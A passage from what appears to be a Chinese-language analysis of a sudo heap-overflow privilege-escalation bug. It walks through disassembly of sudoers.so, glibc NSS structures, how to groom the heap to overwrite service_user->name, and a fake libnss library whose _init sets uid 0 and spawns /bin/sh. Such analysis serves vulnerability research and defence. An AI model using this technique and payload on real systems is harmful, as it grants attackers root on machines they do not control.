        /* Make sure fds 0-2 are open and do OS-specific initialization. */
        fix_fds();
        os_init(argc, argv, envp);
        setlocale(LC_ALL, "");
        ...
随后，我们需要进入 set_cmnd函数。这里我是先通过 sudo的main函数运行加载完 sudoers.so动态库后，下的地址断点。通过分析
sudoers.so的汇编，能够找到下图是上面分析的漏洞代码的开始处：
    //sudoers.so
    .text:000000000001D988                 add     r13, 8
    .text:000000000001D98C ; 345:     v21 = strlen(av);
    .text:000000000001D98C                 call    _strlen
    .text:000000000001D991 ; 346:     av = *v20;
    .text:000000000001D991 ; 349:   while ( *v20 );
    .text:000000000001D991                 mov     rdi, [r13+0]
    .text:000000000001D995 ; 347:     size += v21 + 1;
    .text:000000000001D995                 lea     r14, [r14+rax+1]
    .text:000000000001D99A                 test    rdi, rdi
    .text:000000000001D99D                 jnz     short loc_1D988
    .text:000000000001D99F ; 350:   if ( !size || (user_args = (unsigned __int8 *)malloc(size), to = user_args, (qword_256970 = (__int64)user_args) == 0) )
    .text:000000000001D99F                 test    r14, r14
    .text:000000000001D9A2                 jz      loc_1E4D0
    .text:000000000001D9A8                 mov     rdi, r14        ; size
    .text:000000000001D9AB                 call    _malloc         ; set_cmnd下断点处
    .text:000000000001D9B0                 test    rax, rax
    .text:000000000001D9B3                 mov     r13, rax
    .text:000000000001D9B6                 mov     cs:qword_256970, rax
    .text:000000000001D9BD                 jz      loc_1E4D0
    .text:000000000001D9C3 ; 364:   if ( (sudo_mode & 0x60000) != 0 )
    .text:000000000001D9C3                 test    dword ptr cs:2568F0h, 60000h
    .text:000000000001D9CD ; 363:   from = (unsigned __int8 *)v16[1];
    .text:000000000001D9CD                 mov     r15, [r15+8]
    .text:000000000001D9D1                 jz      loc_1E0E0
    .text:000000000001D9D7 ; 366:     if ( from )
    .text:000000000001D9D7                 test    r15, r15
    .text:000000000001D9DA                 jz      loc_1E288
    .text:000000000001D9E0 ; 368:       while ( 1 )
    .text:000000000001D9E0
    .text:000000000001D9E0 loc_1D9E0:                              ; CODE XREF: sub_1D5C0+CC0↓j
    .text:000000000001D9E0                 movzx   eax, byte ptr [r15]
    .text:000000000001D9E4                 test    al, al
    .text:000000000001D9E6                 jnz     short loc_1DA12
    .text:000000000001D9E8                 jmp     loc_1E268
    .text:000000000001D9E8 ; ---------------------------------------------------------------------------    .text:000000000001D9ED                 align 10h
    .text:000000000001D9F0 ; 375:             v26 = *from;
    .text:000000000001D9F0
    .text:000000000001D9F0 loc_1D9F0:                              ; CODE XREF: sub_1D5C0+458↓j
    .text:000000000001D9F0                                         ; sub_1D5C0+46F↓j
    .text:000000000001D9F0                 mov     rax, r14
    .text:000000000001D9F3                 movzx   edx, byte ptr [r15]
    .text:000000000001D9F7 ; 376:             v27 = from++;
    .text:000000000001D9F7                 mov     r14, r15
    .text:000000000001D9FA                 mov     r15, rax
    .text:000000000001D9FD ; 382:           *to++ = v26;
    .text:000000000001D9FD
    .text:000000000001D9FD loc_1D9FD:                              ; CODE XREF: sub_1D5C0+475↓j
    .text:000000000001D9FD                 add     r13, 1
    .text:000000000001DA01                 mov     [r13-1], dl
    .text:000000000001DA05 ; 370:         for ( from0 = *from; from0; from0 = v27[1] )
    .text:000000000001DA05                 movzx   eax, byte ptr [r14+1]
    .text:000000000001DA0A                 test    al, al
    .text:000000000001DA0C                 jz      loc_1E268
    .text:000000000001DA12 ; 372:           v27 = from + 1;
    .text:000000000001DA12
    .text:000000000001DA12 loc_1DA12:                              ; CODE XREF: sub_1D5C0+426↑j
    .text:000000000001DA12                 cmp     al, 5Ch ; '\'
    .text:000000000001DA14                 lea     r14, [r15+1]
    .text:000000000001DA18 ; 373:           if ( from0 != '\\' || (v28 = __ctype_b_loc(), v26 = from[1], ((*v28)[v26] & 0x2000) != 0) )
    .text:000000000001DA18                 jnz     short loc_1D9F0
    .text:000000000001DA1A                 call    ___ctype_b_loc
    .text:000000000001DA1F                 movzx   ecx, byte ptr [r15+1]
    .text:000000000001DA24                 mov     rax, [rax]
    .text:000000000001DA27                 test    byte ptr [rax+rcx*2+1], 20h
    .text:000000000001DA2C                 mov     rdx, rcx
    .text:000000000001DA2F                 jnz     short loc_1D9F0
    .text:000000000001DA31 ; 380:             from += 2;
    .text:000000000001DA31                 add     r15, 2
    .text:000000000001DA35                 jmp     short loc_1D9FD
直接在 malloc()函数的地址处下断点，就能够得到 user_args堆块的地址，如下图所示：
###  提权方法
这里需要先介绍一下该漏洞所使用的提权方法，先了解一个结构体 service_user 和一个函数 nss_load_library。在
service_user结构体中指定了要动态加载的动态链接库，如果能够修改 service_user->name，那么就能指定加载伪造的动态链接库。而
nss_load_library函数就是加载动态链接库的函数，其会调用 __libc_dlopen打开动态库。
    typedef struct service_library
    {
      /* Name of service (`files', `dns', `nis', ...).  */
      const char *name;
      /* Pointer to the loaded shared library.  */
      void *lib_handle;
      /* And the link to the next entry.  */
      struct service_library *next;
    } service_library;
    // 1. service_user 结构
    typedef struct service_user
    {
      /* And the link to the next entry.  */
      struct service_user *next;
      /* Action according to result.  */
      lookup_actions actions[5];
      /* Link to the underlying library object.  */
      service_library *library;
      /* Collection of known functions.  */
      void *known;
      /* Name of the service (`files', `dns', `nis', ...).  */
      char name[0];
    } service_user;
    // 2. nss_load_library() 函数
    static int nss_load_library (service_user *ni)
    {
      if (ni->library == NULL)
        {
          static name_database default_table;
          ni->library = nss_new_service (service_table ?: &default_table,   // （1）设置 ni->library
                         ni->name);
          if (ni->library == NULL)
        return -1;
        }
      if (ni->library->lib_handle == NULL)
        {
          /* Load the shared library.  */
          size_t shlen = (7 + strlen (ni->name) + 3
                  + strlen (__nss_shlib_revision) + 1);
          int saved_errno = errno;
          char shlib_name[shlen];
          /* Construct shared object name.  */
          __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,   // （2）伪造的库文件名必须是 libnss_xxx.so
                              "libnss_"),
                        ni->name),
                  ".so"),
            __nss_shlib_revision);
          ni->library->lib_handle = __libc_dlopen (shlib_name); // （3）加载目标库
          //continue long long function
这里需要注意 nss_load_library需要满足 ni->library != null和ni->library->lib_handle ==
NULL才能加载新库。
也就是我们需要将 ni->library覆盖为 null，将 ni->name覆盖我们自己伪造的库名字，且伪造的库文件名必须是 libnss_xxx.so。
那么，难点就是如何仅通过一个 堆溢出去覆盖一个 service_user结构。这里的方法是，在一个 service_user结构体前面释放一个堆块，然后
分配 user_args分配到该堆块，随后使用堆溢出覆盖 service_user结构体。
然后，使用 search -s systemd [heap]命令搜索 堆块中的systemd字符串。来定位
service_user结构体的位置，如下所示，可以看到 0x5618621b5450处是一个 service_user结构体。
而，通过malloc分配的 0x80 tcache位于 service_user结构体之前，相差 0x100。
可以看到 serviceuser偏移 0x30处 是 systemd，而我们通过堆溢出可以看到我们将该结构体中的 name覆盖为
X/POP_SH3LLZ（这里的 library在覆盖完后应该为 Null，但是我这里截图是在执行了 nss_new_service所截图，所以这里
library已经有了值）。
将离 user_args最近的 service_user结构体覆盖后，程序会调用 getgrgid()函数，最后去调用 nss_load_library。
    //sudoers.so
    .text:0000000000034720 loc_34720:                              ; CODE XREF: sub_344D0+3E↑j
    .text:0000000000034720                 mov     edi, ebx        ; gid
    .text:0000000000034722                 call    _getgrgid       ; 10
    .text:0000000000034727                 mov     rbx, rax
    .text:000000000003472A                 jmp     loc_3451F
在 nssload_libray中，构造了满足调用新动态链接库的条件，所以会通过 ni->name构造动态链接库的名字 shlib_name为
libnss_X/POP_SH3LLZ .so.2。最终会通过 __libc_dlopen(shlib_name)打开。
而 libnss _X/POP_SH3LLZ_ .so.2中只含有一个 init函数，该函数的作用就是id(0)调用
execv(‘/bin/sh’)，自此完成了提权。
    static void _init(void) {
        printf("[+] bl1ng bl1ng! We got it!\n");
        setuid(0); seteuid(0); setgid(0); setegid(0);
        static char *a_argv[] = { "sh", NULL };
        static char *a_envp[] = { "PATH=/bin:/usr/bin:/sbin", NULL };
        execv("/bin/sh", a_argv);
    }
## 参考文献